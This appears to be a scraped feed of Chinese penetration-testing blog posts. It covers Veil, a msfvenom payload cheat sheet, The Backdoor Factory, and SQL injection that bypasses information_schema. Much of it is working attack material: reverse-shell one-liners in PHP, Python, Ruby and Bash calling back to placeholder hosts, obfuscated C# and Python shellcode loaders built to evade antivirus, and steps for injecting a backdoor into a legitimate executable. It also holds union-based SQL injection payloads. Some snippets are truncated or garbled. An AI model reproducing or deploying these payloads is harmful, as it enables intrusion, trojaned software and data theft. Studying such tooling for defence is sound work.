smb 192.168.1.0/24SMB 192.168.1.4 445 JOHN‐PC [*] Windows 7 Ultimate 7601 Service Pack 1x64 (name:JOHN‐PC) (domain:JOHN‐PC) (signing:False) (SMBv1:True)SMB 192.168.1.99 445 JOHN‐PC [*] Windows 7 Ultimate 7601 Service Packx64 (name:JOHN‐PC) (domain:JOHN‐PC) (signing:False) (SMBv1:True)SMB 192.168.1.119 445 WIN03X64 [*] Windows Server 2003 R2 3790 ServicePack 2 x32 (name:WIN03X64) (domain:WIN03X64) (signing:False) (SMBv1:True 0x07 基于MSF探测由于篇幅原因，放到下一篇中。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"Veil工具笔记","date":"2021-02-24T13:01:57.000Z","path":"2021/02/24/Veil工具笔记/","text":"0x00 前言参考Micro8系列第十一课：https://micro8.gitbook.io/micro8/contents-1/11-20/11-gong-ju-jie-shao-veilevasion 0x01 简介Veil是一款用于生成可绕过常见反病毒检测的Metasploit payload的工具。 如下两个版本的Linux系统是官方支持的Veil： Debian 8+ Kali Linux Rolling 2018.1+ 新版项目地址：https://github.com/Veil-Framework/Veil 旧版项目地址（停更）：https://github.com/Veil-Framework/Veil-Evasion 0x02 安装在Kali中通过apt安装之前，可以先换源使得后续安装比较快速： 1234567891011121314151617181920212223root@John:~/Deskto#cat /etc/apt/sources.list#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#官方源#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib#重庆大学#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib 通过apt快速安装： 12apt -y install veil/usr/share/veil/config/setup.sh --force --silent 或者通过Git安装： 1234apt-get -y install gitgit clone https://github.com/Veil-Framework/Veil.gitcd Veil/./config/setup.sh --force --silent 安装过程比较漫长。 0x03 基本使用…待补充 可支持生成的payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950511) auxiliary/coldwar_wrapper 2) auxiliary/macro_converter 3) auxiliary/pyinstaller_wrapper 4) c/meterpreter/rev_http 5) c/meterpreter/rev_http_service 6) c/meterpreter/rev_tcp 7) c/meterpreter/rev_tcp_service 8) c/shellcode_inject/flatc 9) cs/meterpreter/rev_http 10) cs/meterpreter/rev_https 11) cs/meterpreter/rev_tcp 12) cs/shellcode_inject/base64_substitution 13) cs/shellcode_inject/virtual 14) go/meterpreter/rev_http 15) go/meterpreter/rev_https 16) go/meterpreter/rev_tcp 17) go/shellcode_inject/virtual 18) native/backdoor_factory 19) native/hyperion 20) native/pe_scrambler 21) perl/shellcode_inject/flat 22) powershell/meterpreter/rev_http 23) powershell/meterpreter/rev_https 24) powershell/meterpreter/rev_tcp 25) powershell/shellcode_inject/download_virtual 26) powershell/shellcode_inject/download_virtual_https 27) powershell/shellcode_inject/psexec_virtual 28) powershell/shellcode_inject/virtual 29) python/meterpreter/bind_tcp 30) python/meterpreter/rev_http 31) python/meterpreter/rev_http_contained 32) python/meterpreter/rev_https 33) python/meterpreter/rev_https_contained 34) python/meterpreter/rev_tcp 35) python/shellcode_inject/aes_encrypt 36) python/shellcode_inject/aes_encrypt_HTTPKEY_Request 37) python/shellcode_inject/arc_encrypt 38) python/shellcode_inject/base64_substitution 39) python/shellcode_inject/des_encrypt 40) python/shellcode_inject/download_inject 41) python/shellcode_inject/flat 42) python/shellcode_inject/letter_substitution 43) python/shellcode_inject/pidinject 44) python/shellcode_inject/stallion 45) ruby/meterpreter/rev_http 46) ruby/meterpreter/rev_http_contained 47) ruby/meterpreter/rev_https 48) ruby/meterpreter/rev_https_contained 49) ruby/meterpreter/rev_tcp 50) ruby/shellcode_inject/base64 51) ruby/shellcode_inject/flat","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"工具","slug":"工具","permalink":"https://www.mi1k7ea.com/tags/工具/"}]},{"title":"msfvenom常用生成payload命令","date":"2021-02-22T15:15:36.000Z","path":"2021/02/22/msfvenom常用生成payload命令/","text":"0x00 前言参考参考Micro8系列第十课：https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling 参考Micro8系列第十四课：https://micro8.gitbook.io/micro8/contents-1/11-20/14-ji-yu-di-shi-ke-bu-chong-payload1 参考Micro8系列第十五课：https://micro8.gitbook.io/micro8/contents-1/11-20/15-ji-yu-di-shi-ke-bu-chong-payload2 msfvenom命令参数说明msfvenom命令中文使用说明： 12345678910111213141516171819202122232425Options:-p, --payload &lt;payload&gt; 使用指定的payload--payload-options 列出该payload参数-l, --list [type] 列出所有的payloads-n, --nopsled &lt;length&gt; 为payload指定一个 nopsled 长度-f, --format &lt;format&gt; 指定payload生成格式--help-formats 查看所有支持格式-e, --encoder &lt;encoder&gt; 使用编码器-a, --arch &lt;arch&gt; 指定payload构架--platform &lt;platform&gt; 指定payload平台--help-platforms 显示支持的平台-s, --space &lt;length&gt; 设定payload攻击荷载的最大长度--encoder-space &lt;length&gt; The maximum size of the encoded payload(defaults to the -s value)-b, --bad-chars &lt;list&gt; 指定bad-chars 如: '\\x00\\xff'-i, --iterations &lt;count&gt; 指定编码次数-c, --add-code &lt;path&gt; 指定个win32 shellcode 文件-x, --template &lt;path&gt; 指定一个 executable 文件作为模板-k, --keep payload自动分离并注入到新的进程-o, --out &lt;path&gt; 存放生成的payload-v, --var-name &lt;name&gt; 指定自定义变量--smallest Generate the smallest possible payload-h, --help 显示帮助文件 0x01 Windows1msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe 0x02 Mac1msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho 0x03 Android12//需要签名msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk 0x04 PowerShell1msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 0x05 Linux1msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf 0x06 PHP12msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php 下面补充一些绕过用的payload。 开启监听： 12345msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107 payload1，这个并不全： 123456&lt;?php error_reporting(0); $ip = 'x.x.x.x'; $port = 53; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123;&#123;$port&#125;\"); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s;$GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('s&gt; payload2： 123&lt;?php$sock=fsockopen(\"xx.xx.xx.xx\",xx);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 0x07 ASPX1msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx 0x08 JSP1msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp 0x09 WAR1msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war 0x0A NodeJS1msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js 0x0B Python1msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py 下面补充一些绕过用的payload。 开启监听： 12345msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107 payload1： 123456789101112import socket,struct,timefor x in range(10): try: s=socket.socket(2,socket.SOCK_STREAM) s.connect(('x.x.x.x',xx)) break except: time.sleep(5) l=struct.unpack('&gt;I',s.recv(4))[0]d=s.recv(l)while len(d)&lt;l: d+=s.recv(l-len(d))exec(d,&#123;'s':s&#125;) payload2，这个并不全： 123import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xx.xx.xx.xx\",xx));i\"]); payload3： 123456789101112import socketimport subprocesss=socket.socket()s.connect((\"xx.xx.xx.xx\",xx))while 1: p = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.send(p.stdout.read() + p.stderr.read() ) 删除特征： 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d '\"' | tr -d '\\n' 接着将上述命令生成的payload放入Python的payload中： 123456from ctypes import *reverse_shell = \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72micropoorshell = create_string_buffer(reverse_shell, len(reverse_shell))shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))shellcode() 0x0C Perl1msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl 0x0D Ruby1msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb 下面补充一些绕过用的payload。 payload1： 12require 'socket';c=TCPSocket.new(\"xx.xx.xx.xx\", x);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdi(IO.popen(l,\"rb\")&#123;|fd| fd.each_line &#123;|o| c.puts(o.strip) &#125;&#125;) rescue nil&#125; payload2： 1require 'socket';f=TCPSocket.open(\"xx.xx.xx.xx\",xx).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f) payload3： 1require 'socket';c=TCPSocket.new(\"xx.xx.xx.xx\",\"xx\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end payload4： 1c=TCPSocket.new(\"xx.xx.xx.xx\",\"xx\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;\\|io\\|c.print io.read&#125;end 0x0E Lua1msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua 0x0F Windows Shellcode1msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 0x10 Linux Shellcode1msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 0x11 Mac Shellcode1msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 0x12 Bash1msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh payload1： 1i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xx 0&gt;&amp;1 payload2： 12exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/xxcat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done 0x13 C开启监听： 12345msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107 混淆payload： 1234567891011121314151617181920212223242526272829303132333435using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.namespace RkfCHtll &#123; class LiNGeDokqnEH &#123;static byte[] idCWVw(string VVUUJUQytjlL, int eMcukOUqFuHbUv) &#123; IPEndPoint nlttgWAMdEQgAo = new IPEndPoint(IPAddress.Parse(VVUUJUQytjlL),eMcukOUqFuHbUv); Socket fzTiwdk = new Socket(AddressFamily.InterNetwork,SocketType.Stream, ProtocolType.Tcp); try &#123; fzTiwdk.Connect(nlttgWAMdEQgAo);&#125; catch &#123; return null;&#125; byte[] gJVVagJmu = new byte[4]; fzTiwdk.Receive(gJVVagJmu, 4, 0); int GFxHorfhzft = BitConverter.ToInt32(gJVVagJmu, 0); byte[] mwxyRsYNn = new byte[GFxHorfhzft + 5]; int yVcZAEmXaMszAc = 0; while (yVcZAEmXaMszAc &lt; GFxHorfhzft) &#123; yVcZAEmXaMszAc += fzTiwdk.Receive(mwxyRsYNn,yVcZAEmXaMszAc + 5, (GFxHorfhzft - yVcZAEmXaMszAc) &lt; 4096 byte[] XEvFDc = BitConverter.GetBytes((int)fzTiwdk.Handle); Array.Copy(XEvFDc, 0, mwxyRsYNn, 1, 4); mwxyRsYNn[0] = 0xBF; return mwxyRsYNn;&#125;static void hcvPkmyIZ(byte[] fPnfqu) &#123; if (fPnfqu != null) &#123; UInt32 hcoGPUltNcjK = VirtualAlloc(0,(UInt32)fPnfqu.Length, 0x1000, 0x40); Marshal.Copy(fPnfqu, 0, (IntPtr)(hcoGPUltNcjK), fPnfqu.Length); IntPtr xOxEPnqW = IntPtr.Zero; UInt32 ooiiZLMzO = 0; IntPtr wxPyud = IntPtr.Zero; xOxEPnqW = CreateThread(0, 0, hcoGPUltNcjK, wxPyud, 0, ref ooiiZLMzO); WaitForSingleObject(xOxEPnqW, 0xFFFFFFFF); &#125;&#125;static void Main()&#123; byte[] dCwAid = null; dCwAid = idCWVw(&quot;xx.xx.xx.xx&quot;, xx); hcvPkmyIZ(dCwAid); &#125; [DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 qWBbOS,UInt32 HoKzSHMU, UInt [DllImport(&quot;kernel32&quot;)]private static externIntPtr CreateThread(UInt32 tqUXybrozZ, UInt32 FMmVpwin, UInt32 H[DllImport(&quot;kernel32&quot;)] private static extern UInt32WaitForSingleObject(IntPtr CApwDwK, UInt32 uzGJUddCYTd); 0x14 相关payload生成工具TheFatRat项目地址： https://github.com/Screetsec/TheFatRat TheFatRat是一款使用各种payload编译可在Linux、Windows、Mac和Android上执行的恶意软件的渗透利用工具。TheFatRat提供了一种轻松创建后门和有效payload的方法，可以绕过大多数的防病毒软件。 TheFatRat具有以下特点： 全自动化使用MSFvenom和Metasploit； 生成本地或远程监听器； 按照类型轻松地创建操作系统后门； 生成各种格式的payload； 绕过反病毒后门； 可用于增加文件大小的文件泵； 能够检测外部IP和接口地址； 自动创建用于USB/CDROM利用的AutoRun文件； 下载安装： 1234git clone https://github.com/Screetsec/TheFatRat.gitcd TheFatRat-master/chmod +x setup.sh./setup.sh MSFvenom Payload Creator (MSFPC)项目地址：https://github.com/g0tmi1k/mpc MSFPC是一个可以简化msfvenom命令各种参数使用的工具，本质就是个shell脚本，基于msfvenom命令来快速生成各种类型的Meterpreter payload。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"}]},{"title":"The Backdoor Factory工具笔记","date":"2021-02-22T15:15:17.000Z","path":"2021/02/22/The-Backdoor-Factory工具笔记/","text":"0x00 前言参考Micro8系列第九课：https://micro8.gitbook.io/micro8/contents-1/1-10/9-gong-ju-jie-shao-thebackdoorfactory 0x01 简介The Backdoor Factory即后门工厂，是一款简单实用的后门构造工具，支持Windows PE和Linux ELF两种运行机制的可执行文件，目前来说免杀效果一般。 BDF的目标是实用用户所需的shell代码对可执行二进制文件进行补丁，并继续正常执行预补丁状态。 利用该工具，用户可以在不破坏原有可执行文件的功能的前提下，在文件的代码空隙中插入恶意代码Shellcode。当可执行文件被执行后，就可以触发恶意代码。BDF不仅提供常用的脚本，还允许嵌入其他工具生成的Shellcode，如Metasploit。 工具特点： 目标文件会被拷贝并且打上补丁 注入反弹脚本 修改PE/COFF头以为所有的WIN32 DLL增加附加选项 Kali官网中的介绍：https://tools.kali.org/exploitation-tools/backdoor-factory 工具地址：https://github.com/secretsquirrel/the-backdoor-factory 注意：Kali默认预装的BDF是有问题的，需要从GitHub下载才行。 0x02 基本原理可执行二进制文件中有大量的00，这些00是不包含数据的即无意义的，那么就可以将这些数据替换成payload，并且在程序执行的时候，JMP到代码段来触发payload。 利用其patch方式的编码加密技术，可以轻松的生成Win32 PE后门程序，从而帮助我们绕过一些防病毒软件的查杀，达到一定得免杀效果。 0x03 基本用法下载BDF： 1git clone https://github.com/secretsquirrel/the-backdoor-factory.git 查看参数说明：./backdoor.py -h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101Usage: backdoor.py [options]Options: -h, --help show this help message and exit -f FILE, --file=FILE File to backdoor -s SHELL, --shell=SHELL Payloads that are available for use. Use &apos;show&apos; to see payloads. -H HOST, --hostip=HOST IP of the C2 for reverse connections. -P PORT, --port=PORT The port to either connect back to for reverse shells or to listen on for bind shells -J, --cave_jumping Select this options if you want to use code cave jumping to further hide your shellcode in the binary. -a, --add_new_section Mandating that a new section be added to the exe (better success) but less av avoidance -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE User supplied shellcode, make sure that it matches the architecture that you are targeting. -c, --cave The cave flag will find code caves that can be used for stashing shellcode. This will print to all the code caves of a specific size.The -l flag can be use with this setting. -l SHELL_LEN, --shell_length=SHELL_LEN For use with -c to help find code caves of different sizes -o OUTPUT, --output-file=OUTPUT The backdoor output file -n NSECTION, --section=NSECTION New section name must be less than seven characters -d DIR, --directory=DIR This is the location of the files that you want to backdoor. You can make a directory of file backdooring faster by forcing the attaching of a codecave to the exe by using the -a setting. -w, --change_access This flag changes the section that houses the codecave to RWE. Sometimes this is necessary. Enabled by default. If disabled, the backdoor may fail. -i, --injector This command turns the backdoor factory in a hunt and shellcode inject type of mechanism. Edit the target settings in the injector module. -u SUFFIX, --suffix=SUFFIX For use with injector, places a suffix on the original file for easy recovery -D, --delete_original For use with injector module. This command deletes the original file. Not for use in production systems. *Author not responsible for stupid uses.* -O DISK_OFFSET, --disk_offset=DISK_OFFSET Starting point on disk offset, in bytes. Some authors want to obfuscate their on disk offset to avoid reverse engineering, if you find one of those files use this flag, after you find the offset. -S, --support_check To determine if the file is supported by BDF prior to backdooring the file. For use by itself or with verbose. This check happens automatically if the backdooring is attempted. -M, --cave-miner Future use, to help determine smallest shellcode possible in a PE file -q, --no_banner Kills the banner. -v, --verbose For debug information output. -T IMAGE_TYPE, --image-type=IMAGE_TYPE ALL, x86, or x64 type binaries only. Default=ALL -Z, --zero_cert Allows for the overwriting of the pointer to the PE certificate table effectively removing the certificate from the binary for all intents and purposes. -R, --runas_admin EXPERIMENTAL Checks the PE binaries for &apos;requestedExecutionLevel level=&quot;highestAvailable&quot;&apos;. If this string is included in the binary, it must run as system/admin. If not in Support Check mode it will attmept to patch highestAvailable into the manifest if requestedExecutionLevel entry exists. -L, --patch_dll Use this setting if you DON&apos;T want to patch DLLs. Patches by default. -F FAT_PRIORITY, --fat_priority=FAT_PRIORITY For MACH-O format. If fat file, focus on which arch to patch. Default is x64. To force x86 use -F x86, to force both archs use -F ALL. -B BEACON, --beacon=BEACON For payloads that have the ability to beacon out, set the time in secs -m PATCH_METHOD, --patch-method=PATCH_METHOD Patching methods for PE files, &apos;manual&apos;,&apos;automatic&apos;, replace and onionduke -b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY For onionduke. Provide your desired binary. -X, --xp_mode Default: DO NOT support for XP legacy machines, use -X to support XP. By default the binary will crash on XP machines (e.g. sandboxes) -A, --idt_in_cave EXPERIMENTAL By default a new Import Directory Table is created in a new section, by calling this flag it will be put in a code cave. This can cause bianry failure is some cases. Test on target binaries first. -C, --code_sign For those with codesigning certs wishing to sign PE binaries only. Name your signing key and private key signingcert.cer and signingPrivateKey.pem repectively in the certs directory it&apos;s up to you to obtain signing certs. -p, --preprocess To execute preprocessing scripts in the preprocess directory 检测是否支持后门植入，这里以IPOP.exe为例： 1./backdoor.py -f ~/IPOP.exe -S 测试裂缝空间size 150： 1./backdoor.py -f ~/IPOP.exe -c -l 150 查看可用payload： 1./backdoor.py -f ~/IPOP.exe -s show 插入payload，并生成文件： 1./backdoor.py -f ~/IPOP.exe -H 192.168.1.9 -P 1234 -s iat_reverse_tcp_stager_threaded 对比原文件与生成文件MD5值： 1md5sum ~/IPOP.exe ./backdoored/IPOP.exe 对比原文件与生成文件大小： 1du -k ~/IPOP.exe ./backdoored/IPOP.exe 在msf中开启本地监听： 12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.1.9lhost =&gt; 192.168.1.9msf exploit(handler) &gt; set lport 1234lport =&gt; 1234msf exploit(handler) &gt; exploit -j 当目标机器打开BDF加后门之后的IPOP.exe软件后，就能获取到反弹shell。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"工具","slug":"工具","permalink":"https://www.mi1k7ea.com/tags/工具/"}]},{"title":"无列名注入绕过information_schema","date":"2021-02-21T06:00:25.000Z","path":"2021/02/21/无列名注入绕过information-schema/","text":"0x00 前言有时候在进行SQL注入中，WAF会过滤掉information_schema这个库，这对我们进行手注产生了一定的障碍，此时就可以用到无列名注入来绕过。 0x01 information_schema库简介information_schema是MySQL中自带的一个信息数据库，它提供了访问数据库元数据的方式，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名、表名、字段名、相关的数据类型与访问权限等。 information_schema数据库中相关表的说明： SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表 在SQL注入中的利用一般的，在SQL注入中，都是先通过information_schema库来查询MySQL中存在哪些数据库、指定数据库存在哪些表、指定表存在哪些字段等等。 常规利用方式： 12345678# 查询所有数据库select schema_name from information_schema.schemata;# 查询指定数据库存在哪些表select table_name from information_schema.tables where table_schema='security';# 查询指定表存在哪些字段select column_name from information_schema.columns where table_schema='security' and table_name='users'; 然后，就是根据查询到的表名、列明进行进一步的查询即可得到目标数据。 但是，在一些WAF中是过滤了information_schema的，此时需要换种方式注入。 0x02 InnoDb引擎从MySQL 5.5.8开始，InnoDB成为其默认存储引擎。而在MySQL 5.6以上的版本中，InnoDb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。 在MySQL 5.6版本中，可以使用mysql.innodb_table_stats和mysql.innodb_table_index这两张表来替换information_schema.tables实现注入，但是缺点是没有列名。 利用示例： 12?id=0&apos; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23?id=0&apos; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23 在本地环境中，MySQL版本为5.7，InnoDB引擎并不是作为默认数据库引擎，自然而然其中这两个表不包含新建立的库和表相关信息了，比较鸡肋： 查看MySQL支持及默认的存储引擎： 1show engines; 在MySQL配置文件中添加如下配置开启InnoDb存储引擎： 1default-storage-engine=InnoDB 0x03 sys库简介在MySQL 5.7中，新增了sys系统数据库，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。 sys库下有两种表： 字母开头： 适合人阅读，显示是格式化的数； x$开头 ： 适合工具采集数据，原始类数据； 在SQL注入中的利用当information_schema库被WAF过滤后，我们可以使用sys库进行替换利用。 sys.schema_auto_increment_columnsschema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。 在设计表时，一般会给一些字段设置自增，而schema_auto_increment_columns视图中保存的就是那些有自增字段的表的数据库相关信息。 本地环境中保存有security库及其相关表的信息，这是因为这个数据库中这些表的id列都是设置为自增的： 基于这个特性，就能替换information_schema来查询数据库和表了： 1234# 查询数据库select table_schema from sys.schema_auto_increment_columns;# 查询指定数据库的表select table_name from sys.schema_auto_increment_columns where table_schema='security'; 但是这里有个明显的不足就是，无法查询指定数据库中某表的列。 schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer前面的schema_auto_increment_columns对应的是存在自增列的表，但是针对不存在自增列的表的话可以通过本小节的这个视图来实现查询。 比如本地challenges库的表中并没有含有自增列，但是在schema_table_statistics_with_buffer中能查询： 同理的利用： 123456# 查询数据库select table_schema from sys.schema_table_statistics_with_buffer;select table_schema from sys.x$schema_table_statistics_with_buffer;# 查询指定数据库的表select table_name from sys.schema_table_statistics_with_buffer where table_schema='challenges';select table_name from sys.x$schema_table_statistics_with_buffer where table_schema='challenges'; 但是缺陷也是一样的，无法查询指定数据库中某表的列。 0x04 无列名注入前面说的sys库替换information_schema库的使用还存在个不足就是查询不到列，此时就可以利用无列名注入来实现。 join … using …以sqli-labs的环境为例，通过ERROR提示的列名逐个using来爆出其他列名即可： 12select * from users where id='0' union all select * from (select * from users as a join users as b)as c;select * from users where id='0' union all select * from (select * from users as a join users as b using(id,username,password))as c; Web端： order by盲注order by用于根据指定的列对结果集进行排序。一般上是从0-9、a-z排序，不区分大小写。 order by盲注为何可以用于无列名注入呢？看个例子。 比如当我们需要猜解第三列的内容时，使用order by实例如下： 当猜测的值大于当前值时，会返回原来的数据即这里看第二列返回是否正常的username，否则会返回猜测的值。此时我们取临界值根据返回内容的二元组继续逐位猜解即可： 当然，相比之下没有其他无列名注入的方法好用。 子查询子查询也能用于无列名注入，主要是结合union select联合查询构造列名再放到子查询中实现。 使用如下union联合查询，可以给当前整个查询的列分别赋予1、2、3的名字： 1select 1,2,3 union select * from users; 接着使用子查询就能指定查询刚刚赋予的列名对应的列内容了： 12select `3` from (select 1,2,3 union select * from users)x;select x.3 from (select 1,2,3 union select * from users)x; 在sqli-labs中的利用： 123?id=0&apos; union select 1,2,group_concat(`3`) from (select 1,2,3 union select * from users)x;%23?id=0&apos; union select 1,2,group_concat(x.3) from (select 1,2,3 union select * from users)x;%23?id=0&apos; union select 1,2,group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x;%23 0x0n 参考聊一聊bypass information_schema 